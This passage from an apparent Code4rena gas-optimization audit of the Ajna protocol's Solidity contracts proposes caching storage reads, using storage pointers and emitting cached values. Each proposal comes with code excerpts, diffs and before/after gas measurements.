         newProposal.distributionId  = currentDistribution.id;
-        newProposal.tokensRequested = _validateCallDatas(targets_, values_, calldatas_); // check proposal parameters are valid and update tokensRequested
+        uint128 _tokensRequested = _validateCallDatas(targets_, values_, calldatas_); // check proposal parameters are valid and update tokensRequested
+        newProposal.tokensRequested = _tokensRequested;

         // revert if proposal requested more tokens than are available in the distribution period
-        if (newProposal.tokensRequested > (currentDistribution.fundsAvailable * 9 / 10)) revert InvalidProposal();
+        if (_tokensRequested > (currentDistribution.fundsAvailable * 9 / 10)) revert InvalidProposal();

         emit ProposalCreated(
             proposalId_,
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L641-L649

### Cache `existingVote.votesUsed` to save 1 SLOAD
```solidity
File: ajna-grants/base/StandardFunding.sol
641:            if (support == 0 && existingVote.votesUsed > 0 || support == 1 && existingVote.votesUsed < 0) { // audit: 1st sload
642:                // if the vote is in the opposite direction of a previous vote,
643:                // and the proposal is already in the votesCast array, revert can't change direction
644:                revert FundingVoteWrongDirection();
645:            }
646:            else {
647:                // update the votes cast for the proposal
648:                existingVote.votesUsed += voteParams_.votesUsed; // @audit: 2nd sload
649:            }
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..9fc8ca3 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -638,14 +638,15 @@ abstract contract StandardFunding is Funding, IStandardFunding {
             FundingVoteParams storage existingVote = votesCast[uint256(voteCastIndex)];

             // can't change the direction of a previous vote
-            if (support == 0 && existingVote.votesUsed > 0 || support == 1 && existingVote.votesUsed < 0) {
+            int256 _votesUsed = existingVote.votesUsed;
+            if (support == 0 && _votesUsed > 0 || support == 1 && _votesUsed < 0) {
                 // if the vote is in the opposite direction of a previous vote,
                 // and the proposal is already in the votesCast array, revert can't change direction
                 revert FundingVoteWrongDirection();
             }
             else {
                 // update the votes cast for the proposal
-                existingVote.votesUsed += voteParams_.votesUsed;
+                existingVote.votesUsed = _votesUsed + voteParams_.votesUsed;
             }
         }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L703-L743

### Use already cached `distributionId` to save 2 SLOADs
```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
703:        uint24 distributionId = proposal_.distributionId; // @audit: 1st sload
...
743:        screeningVotesCast[proposal_.distributionId][account_] += votes_; // @audit: 2nd & 3rd sload
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..15e21fb 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -740,7 +740,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         }

         // record voters vote
-        screeningVotesCast[proposal_.distributionId][account_] += votes_;
+        screeningVotesCast[distributionId][account_] += votes_;

         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally
         emit VoteCast(
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L706-L743

### Cache `screeningVotesCast[distributionId][account_]` to save 1 SLOAD
```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
706        if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower(); // @audit: 1st sload
...
743:        screeningVotesCast[proposal_.distributionId][account_] += votes_; // @audit: 2nd sload
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..9ed774a 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -703,7 +703,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         uint24 distributionId = proposal_.distributionId;

         // check that the voter has enough voting power to cast the vote
-        if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();
+        uint256 _screeningVotesCast = screeningVotesCast[distributionId][account_];
+        if (_screeningVotesCast + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();

         uint256[] storage currentTopTenProposals = _topTenProposals[distributionId];
         uint256 proposalId = proposal_.proposalId;
@@ -740,7 +741,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         }

         // record voters vote
-        screeningVotesCast[proposal_.distributionId][account_] += votes_;
+        screeningVotesCast[proposal_.distributionId][account_] = _screeningVotesCast + votes_;

         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally
         emit VoteCast(
```

## [G-03] Refactor internal function to avoid unnecessary SLOAD
The internal functions below read storage slots that are previously read in the functions that invoke them. We can refactor the internal functions so we could pass cached storage variables as stack variables and avoid the extra storage reads that would otherwise take place in the internal functions.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L227-L229

*Gas Savings for `GrantFund.startNewDistributionPeriod`, obtained via protocol's tests: Avg 159 gas*

|        |    Max   |
| ------ | -------- |
| Before |   75597  |  
| After  |   75438  | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
227:    function _setNewDistributionId() private returns (uint24 newId_) {
228:        newId_ = _currentDistributionId += 1;
229:    }
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..87dd264 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -143,7 +143,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         uint48 endBlock = startBlock + DISTRIBUTION_PERIOD_LENGTH;

         // set new value for currentDistributionId
-        newDistributionId_ = _setNewDistributionId();
+        newDistributionId_ = _setNewDistributionId(currentDistributionId);

         // create QuarterlyDistribution struct
         QuarterlyDistribution storage newDistributionPeriod = _distributions[newDistributionId_];
@@ -224,8 +224,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {
      * @dev    Increments the previous Id nonce by 1.
      * @return newId_ The new distribution period Id.
      */
-    function _setNewDistributionId() private returns (uint24 newId_) {
-        newId_ = _currentDistributionId += 1;
+    function _setNewDistributionId(uint24 _currentId) private returns (uint24 newId_) {
+        newId_ = _currentId + 1;
+        _currentDistributionId = newId_;
     }

     /************************************/
```

## [G-04] Using storage instead of memory for structs/arrays saves gas
Using a memory pointer for a storage struct/array will effectively load all the fields of that data type from storage (SLOAD) into memory (MSTORE). Using a storage pointer will allow you to read specific fields from storage as you need them. If you are not going to use all of the fields of your data type then you should use a storage pointer so that you don't incur extra `Gcoldsload (2100 gas)` for fields that you will never use.

**Note: These are instances that the automated report missed**.

Total Instances: `12`

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L440-L442

*Gas Savings for `RewardsManager.claimRewards`, obtained via protocol's tests: Avg 3726 gas*

|        |    Max   |
| ------ | -------- |
| Before |  393064  |  
| After  |  389338  | 

```solidity
File: ajna-core/src/RewardsManager.sol
440:       for (uint256 i = 0; i < positionIndexes_.length; ) {
441:           bucketIndex = positionIndexes_[i];
442:           BucketState memory bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..bec53c1 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -439,7 +439,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         // iterate through all buckets and calculate epoch rewards for
         for (uint256 i = 0; i < positionIndexes_.length; ) {
             bucketIndex = positionIndexes_[i];
-            BucketState memory bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];
+            BucketState storage bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];

             uint256 bucketRate;
             if (epoch_ != stakingEpoch_) {
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L236-L250

*Gas Savings for `GrantFund.claimDelegateReward`, obtained via protocol's tests: Avg 926 gas*

|        |    Max   |
| ------ | -------- |
| Before |   65340  |  
| After  |   64414  | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
236:    function claimDelegateReward(
237:        uint24 distributionId_
238:    ) external override returns(uint256 rewardClaimed_) {
239:        // Revert if delegatee didn't vote in screening stage
240:        if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();
241:
242:        QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];
243:
244:        // Check if Challenge Period is still active
245:        if(block.number < _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();
246:
247:        // check rewards haven't already been claimed
248:        if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();
249:
250:        QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..6b3cc5e 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -239,7 +239,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         // Revert if delegatee didn't vote in screening stage
         if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();

-        QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];
+        QuarterlyDistribution storage currentDistribution = _distributions[distributionId_];

         // Check if Challenge Period is still active
         if(block.number < _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();
@@ -247,7 +247,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         // check rewards haven't already been claimed
         if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();

-        QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];
+        QuadraticVoter storage voter = _quadraticVoters[distributionId_][msg.sender];

         // calculate rewards earned for voting
         rewardClaimed_ = _getDelegateReward(currentDistribution, voter);
@@ -272,9 +272,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {
      * @return rewards_             The delegate rewards accrued to the voter.
      */
     function _getDelegateReward(
-        QuarterlyDistribution memory currentDistribution_,
-        QuadraticVoter memory voter_
-    ) internal pure returns (uint256 rewards_) {
+        QuarterlyDistribution storage currentDistribution_,
+        QuadraticVoter storage voter_
+    ) internal view returns (uint256 rewards_) {
         // calculate the total voting power available to the voter that was allocated in the funding stage
         uint256 votingPowerAllocatedByDelegatee = voter_.votingPower - voter_.remainingVotingPower;

@@ -918,8 +918,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         uint24 distributionId_,
         address voter_
     ) external view override returns (uint256 rewards_) {
-        QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];
-        QuadraticVoter        memory voter               = _quadraticVoters[distributionId_][voter_];
+        QuarterlyDistribution storage currentDistribution = _distributions[distributionId_];
+        QuadraticVoter        storage voter               = _quadraticVoters[distributionId_][voter_];

         rewards_ = _getDelegateReward(currentDistribution, voter);
     }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L434-L435

*Gas Savings for `GrantFund.updateSlate`, obtained via protocol's tests: Avg 2387 gas*

|        |    Max   |
| ------ | -------- |
| Before |   318329 |  
| After  |   315942 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
434:        for (uint i = 0; i < numProposalsInSlate_; ) {
435:            Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..115edd4 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -432,7 +432,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {

         // check each proposal in the slate is valid
         for (uint i = 0; i < numProposalsInSlate_; ) {
-            Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];
+            Proposal storage proposal = _standardFundingProposals[proposalIds_[i]];

             // check if Proposal is in the topTenProposals list
             if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L763-L766

*Gas Savings for `GrantFund.fundingVote`, obtained via protocol's tests: Avg 2372 gas*

|        |    Max   |
| ------ | -------- |
| Before |   409345 |  
| After  |   406973 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
763:    function _findProposalIndex(
764:        uint256 proposalId_,
765:        uint256[] memory array_
766:    ) internal pure returns (int256 index_) {
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..ea0c1cd 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -762,8 +762,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
      */
     function _findProposalIndex(
         uint256 proposalId_,
-        uint256[] memory array_
-    ) internal pure returns (int256 index_) {
+        uint256[] storage array_
+    ) internal view returns (int256 index_) {
         index_ = -1; // default value indicating proposalId not in the array
         int256 arrayLength = int256(array_.length);
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L789-L792

*Gas Savings for `GrantFund.fundingVote`, obtained via protocol's tests: Avg 3307 gas*

|        |    Max   |
| ------ | -------- |
| Before |   409345 |  
| After  |   406038 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
789:    function _findProposalIndexOfVotesCast(
790:        uint256 proposalId_,
791:        FundingVoteParams[] memory voteParams_
792:    ) internal pure returns (int256 index_) {
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..64d1163 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -788,8 +788,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
      */
     function _findProposalIndexOfVotesCast(
         uint256 proposalId_,
-        FundingVoteParams[] memory voteParams_
-    ) internal pure returns (int256 index_) {
+        FundingVoteParams[] storage voteParams_
+    ) internal view returns (int256 index_) {
         index_ = -1; // default value indicating proposalId not in the array
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L843-L845

*Gas Savings for `GrantFund.fundingVote`, obtained via protocol's tests: Avg 4282 gas*

|        |    Max   |
| ------ | -------- |
| Before |   409345 |  
| After  |   405063 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
843:    function _sumSquareOfVotesCast(
844:        FundingVoteParams[] memory votesCast_
845:    ) internal pure returns (uint256 votesCastSumSquared_) {
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..b79bec9 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -841,8 +841,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
      * @return votesCastSumSquared_ The sum of the square of each vote cast.
      */
     function _sumSquareOfVotesCast(
-        FundingVoteParams[] memory votesCast_
-    ) internal pure returns (uint256 votesCastSumSquared_) {
+        FundingVoteParams[] storage votesCast_
+    ) internal view returns (uint256 votesCastSumSquared_) {
         uint256 numVotesCast = votesCast_.length;

         for (uint256 i = 0; i < numVotesCast; ) {
```

## [G-05] Avoid emitting storage values
Caching of a state variable replaces each `Gwarmaccess (100 gas)` with a much cheaper stack read. We can avoid unecessary SLOADs by caching storage values that were previously accessed and emitting those cached values.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/GrantFund.sol#L58-L64

### Cache expression and emit cached value instead of reading from storage
```solidity
File: ajna-grants/src/grants/GrantFund.sol
58:    function fundTreasury(uint256 fundingAmount_) external override {
59:        IERC20 token = IERC20(ajnaTokenAddress);
60:        // update treasury accounting
61:        treasury += fundingAmount_;
62:        emit FundTreasury(fundingAmount_, treasury); // @audit: emit expression
```
```diff
diff --git a/src/grants/GrantFund.sol b/src/grants/GrantFund.sol
index 3d568b0..fb9f369 100644
--- a/src/grants/GrantFund.sol
+++ b/src/grants/GrantFund.sol
@@ -59,12 +59,14 @@ contract GrantFund is IGrantFund, ExtraordinaryFunding, StandardFunding {
         IERC20 token = IERC20(ajnaTokenAddress);

         // update treasury accounting
-        treasury += fundingAmount_;
+        uint256 _newTreasury = treasury + fundingAmount_;
+        treasury = _newTreasury;

-        emit FundTreasury(fundingAmount_, treasury);
+        emit FundTreasury(fundingAmount_, _newTreasury);

         // transfer ajna tokens to the treasury
         token.safeTransferFrom(msg.sender, address(this), fundingAmount_);
     }

 }
```

## [G-06] Multiple accesses of a mapping/array should use a storage pointer
Caching a mapping's value in a storage pointer when the value is accessed multiple times saves ~40 gas per access due to not having to perform the same offset calculation every time. Help the Optimizer by saving a storage variable's reference instead of repeatedly fetching it.

To achieve this, declare a storage pointer for the variable and use it instead of repeatedly fetching the reference in a map or an array. As an example, instead of repeatedly calling `stakes[tokenId_]`, save its reference via a storage pointer: `StakeInfo storage stakeInfo = stakes[tokenId_]` and use the pointer instead.

**Note: These are instances the automated report missed**

Total Instances: `14`

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L389-L412

*Gas Savings for `RewardsManager.claimRewards`, obtained via protocol's tests: Avg 290 gas*

|        |    Max   |
| ------ | -------- |
| Before |  393064  |  
| After  |  392774  | 

### Cache storage pointers for `stakes[tokenId_]` and `isEpochClaimed[tokenId_]`
```solidity
File: ajna-core/src/RewardsManager.sol
389:        address ajnaPool         = stakes[tokenId_].ajnaPool;
390:        uint256 lastClaimedEpoch = stakes[tokenId_].lastClaimedEpoch;
391:        uint256 stakingEpoch     = stakes[tokenId_].stakingEpoch;
...
411:            rewardsClaimed[epoch]           += nextEpochRewards;
412:            isEpochClaimed[tokenId_][epoch] = true;
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..028e487 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -385,14 +385,16 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         uint256 tokenId_,
         uint256 epochToClaim_
     ) internal returns (uint256 rewards_) {
-
-        address ajnaPool         = stakes[tokenId_].ajnaPool;
-        uint256 lastClaimedEpoch = stakes[tokenId_].lastClaimedEpoch;
-        uint256 stakingEpoch     = stakes[tokenId_].stakingEpoch;
+
+        StakeInfo storage stakeInfo = stakes[tokenId_];
+        address ajnaPool         = stakeInfo.ajnaPool;
+        uint256 lastClaimedEpoch = stakeInfo.lastClaimedEpoch;
+        uint256 stakingEpoch     = stakeInfo.stakingEpoch;

         uint256[] memory positionIndexes = positionManager.getPositionIndexesFiltered(tokenId_);

         // iterate through all burn periods to calculate and claim rewards
+        mapping(uint256 => bool) storage _isEpochClaimed = isEpochClaimed[tokenId_];
         for (uint256 epoch = lastClaimedEpoch; epoch < epochToClaim_; ) {

             uint256 nextEpochRewards = _calculateNextEpochRewards(
@@ -409,7 +411,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

             // update epoch token claim trackers
             rewardsClaimed[epoch]           += nextEpochRewards;
-            isEpochClaimed[tokenId_][epoch] = true;
+            _isEpochClaimed[epoch] = true;
         }
     }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L748-L755

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L775-L785

*Gas Savings for `RewardsManager.moveStakedLiquidity`, obtained via protocol's tests: Avg 1373 gas*

|        |    Max   |
| ------ | -------- |
| Before |  2112272  |  
| After  |  2110899  | 

### Cache storage pointer for `bucketExchangeRates[pool_][bucketIndex_]`
```solidity
File: ajna-core/src/RewardsManager.sol
748:        uint256 burnExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_];
749:
750:        // update bucket exchange rate at epoch only if it wasn't previously updated
751:        if (burnExchangeRate == 0) {
752:            uint256 curBucketExchangeRate = IPool(pool_).bucketExchangeRate(bucketIndex_);
753:
754:            // record bucket exchange rate at epoch
755:            bucketExchangeRates[pool_][bucketIndex_][burnEpoch_] = curBucketExchangeRate;

775:        uint256 burnExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_];
776:
777:        // update bucket exchange rate at epoch only if it wasn't previously updated
778:        if (burnExchangeRate == 0) {
779:            uint256 curBucketExchangeRate = IPool(pool_).bucketExchangeRate(bucketIndex_);
780:
781:            // record bucket exchange rate at epoch
782:            bucketExchangeRates[pool_][bucketIndex_][burnEpoch_] = curBucketExchangeRate;
783:
784:            // retrieve the bucket exchange rate at the previous epoch
785:            uint256 prevBucketExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_ - 1];
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..8e2250e 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -745,14 +745,15 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         uint256 bucketIndex_,
         uint256 burnEpoch_
     ) internal {
-        uint256 burnExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_];
+        mapping(uint256 => uint256) storage _bucketExchangeRates = bucketExchangeRates[pool_][bucketIndex_];
+        uint256 burnExchangeRate = _bucketExchangeRates[burnEpoch_];

         // update bucket exchange rate at epoch only if it wasn't previously updated
         if (burnExchangeRate == 0) {
             uint256 curBucketExchangeRate = IPool(pool_).bucketExchangeRate(bucketIndex_);

             // record bucket exchange rate at epoch
-            bucketExchangeRates[pool_][bucketIndex_][burnEpoch_] = curBucketExchangeRate;
+            _bucketExchangeRates[burnEpoch_] = curBucketExchangeRate;
         }
     }

@@ -772,17 +773,18 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         uint256 totalBurned_,
         uint256 interestEarned_
     ) internal returns (uint256 rewards_) {
-        uint256 burnExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_];
+        mapping(uint256 => uint256) storage _bucketExchangeRates = bucketExchangeRates[pool_][bucketIndex_];
+        uint256 burnExchangeRate = _bucketExchangeRates[burnEpoch_];

         // update bucket exchange rate at epoch only if it wasn't previously updated
         if (burnExchangeRate == 0) {
             uint256 curBucketExchangeRate = IPool(pool_).bucketExchangeRate(bucketIndex_);

             // record bucket exchange rate at epoch
-            bucketExchangeRates[pool_][bucketIndex_][burnEpoch_] = curBucketExchangeRate;
+            _bucketExchangeRates[burnEpoch_] = curBucketExchangeRate;

             // retrieve the bucket exchange rate at the previous epoch
-            uint256 prevBucketExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_ - 1];
+            uint256 prevBucketExchangeRate = _bucketExchangeRates[burnEpoch_ - 1];

             // skip reward calculation if update at the previous epoch was missed and if exchange rate decreased due to bad debt
             // prevents excess rewards from being provided from using a 0 value as an input to the interestFactor calculation below.
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L442-L448

*Gas Savings for `RewardsManager.claimRewards`, obtained via protocol's tests: Avg 4795 gas*

|        |    Max   |
| ------ | -------- |
| Before |  393064  |  
| After  |  388269  | 

### Cache storage pointer for `bucketExchangeRates[ajnaPool_]` and `stakes[tokenId_]`
```solidity
File: ajna-core/src/RewardsManager.sol
442:            BucketState memory bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];
443:
444:            uint256 bucketRate;
445:            if (epoch_ != stakingEpoch_) {
446:
447:                // if staked in a previous epoch then use the initial exchange rate of epoch
448:                bucketRate = bucketExchangeRates[ajnaPool_][bucketIndex][epoch_];
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..e416c82 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -437,15 +437,17 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         uint256 interestEarned;

         // iterate through all buckets and calculate epoch rewards for
+        StakeInfo storage _stakeInfo = stakes[tokenId_];
+        mapping(uint256 => mapping(uint256 => uint256)) storage _bucketExchangeRates = bucketExchangeRates[ajnaPool_];
         for (uint256 i = 0; i < positionIndexes_.length; ) {
             bucketIndex = positionIndexes_[i];
-            BucketState memory bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];
+            BucketState memory bucketSnapshot = _stakeInfo.snapshot[bucketIndex];

             uint256 bucketRate;
             if (epoch_ != stakingEpoch_) {

                 // if staked in a previous epoch then use the initial exchange rate of epoch
-                bucketRate = bucketExchangeRates[ajnaPool_][bucketIndex][epoch_];
+                bucketRate = _bucketExchangeRates[bucketIndex][epoch_];
             } else {

                 // if staked during the epoch then use the bucket rate at the time of staking
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L190-L207

*Gas Savings for `PositionManager.memorializePositions`, obtained via protocol's tests: Avg 1043 gas*

|        |    Max   |
| ------ | -------- |
| Before |  1134444 |  
| After  |  1133401 | 

### Cache storage pointer for `positions[params_.tokenId]`
```solidity
File: ajna-core/src/PositionManager.sol
190:            Position memory position = positions[params_.tokenId][index];
191:
192:            // check for previous deposits
193:            if (position.depositTime != 0) {
194:                // check that bucket didn't go bankrupt after prior memorialization
195:                if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {
196:                    // if bucket did go bankrupt, zero out the LP tracked by position manager
197:                    position.lps = 0;
198:                }
199:            }
200:
201:            // update token position LP
202:            position.lps += lpBalance;
203:            // set token's position deposit time to the original lender's deposit time
204:            position.depositTime = depositTime;
205:
206:            // save position in storage
207:            positions[params_.tokenId][index] = position;
```
```diff
diff --git a/src/PositionManager.sol b/src/PositionManager.sol
index 261fbc1..08e09a9 100644
--- a/src/PositionManager.sol
+++ b/src/PositionManager.sol
@@ -177,7 +177,8 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R

         uint256 indexesLength = params_.indexes.length;
         uint256 index;
-
+
+        mapping(uint256 => Position) storage _position = positions[params_.tokenId];
         for (uint256 i = 0; i < indexesLength; ) {
             index = params_.indexes[i];

@@ -186,8 +187,8 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
             positionIndex.add(index);

             (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);
-
-            Position memory position = positions[params_.tokenId][index];
+
+            Position memory position = _position[index];

             // check for previous deposits
             if (position.depositTime != 0) {
@@ -204,7 +205,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
             position.depositTime = depositTime;

             // save position in storage
-            positions[params_.tokenId][index] = position;
+            _position[index] = position;

             unchecked { ++i; }
         }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L367-L380

*Gas Savings for `PositionManager.reedemPositions`, obtained via protocol's tests: Avg 167 gas*

|        |    Max   |
| ------ | -------- |
| Before |  139811  |  
| After  |  139644  | 

### Cache storage pointer for `positions[params_.tokenId]`
```solidity
File: ajna-core/src/PositionManager.sol
367:            Position memory position = positions[params_.tokenId][index];
368:
369:            if (position.depositTime == 0 || position.lps == 0) revert RemovePositionFailed();
370:
371:            // check that bucket didn't go bankrupt after memorialization
372:            if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) revert BucketBankrupt();
373:
374:            // remove bucket index at which a position has added liquidity
375:            if (!positionIndex.remove(index)) revert RemovePositionFailed();
376:
377:            lpAmounts[i] = position.lps;
378:
379:            // remove LP tracked by position manager at bucket index
380:            delete positions[params_.tokenId][index];
```
```diff
diff --git a/src/PositionManager.sol b/src/PositionManager.sol
index 261fbc1..09f3417 100644
--- a/src/PositionManager.sol
+++ b/src/PositionManager.sol
@@ -360,11 +360,12 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         uint256[] memory lpAmounts = new uint256[](indexesLength);

         uint256 index;
-
+
+        mapping(uint256 => Position) storage _position = positions[params_.tokenId];
         for (uint256 i = 0; i < indexesLength; ) {
             index = params_.indexes[i];

-            Position memory position = positions[params_.tokenId][index];
+            Position memory position = _position[index];

             if (position.depositTime == 0 || position.lps == 0) revert RemovePositionFailed();

@@ -377,7 +378,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
             lpAmounts[i] = position.lps;

             // remove LP tracked by position manager at bucket index
-            delete positions[params_.tokenId][index];
+            delete _position[index];

             unchecked { ++i; }
         }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L135-L148

*Gas Savings for `GrantFund.voteExtraordinary`, obtained via protocol's tests: Avg 67 gas*

|        |    Max   |
| ------ | -------- |
| Before |   31424  |  
| After  |   31357  | 

### Cache storage pointer for `hashVotedExtraordinary[proposalId_]`
```solidity
File: ajna-grants/src/grants/base/ExtraordinaryFunding.sol
135:        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();
136:
137:        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];
138:        // revert if proposal is inactive
139:        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {
140:            revert ExtraordinaryFundingProposalInactive();
141:        }
142:
143:        // check voting power at snapshot block and update proposal votes
144:        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);
145:        proposal.votesReceived += SafeCast.toUint120(votesCast_);
146:
147:        // record that voter has voted on this extraordinary funding proposal
148:        hasVotedExtraordinary[proposalId_][msg.sender] = true;
```
```diff
diff --git a/src/grants/base/ExtraordinaryFunding.sol b/src/grants/base/ExtraordinaryFunding.sol
index 4a70abb..e128c97 100644
--- a/src/grants/base/ExtraordinaryFunding.sol
+++ b/src/grants/base/ExtraordinaryFunding.sol
@@ -132,7 +132,8 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {
         uint256 proposalId_
     ) external override returns (uint256 votesCast_) {
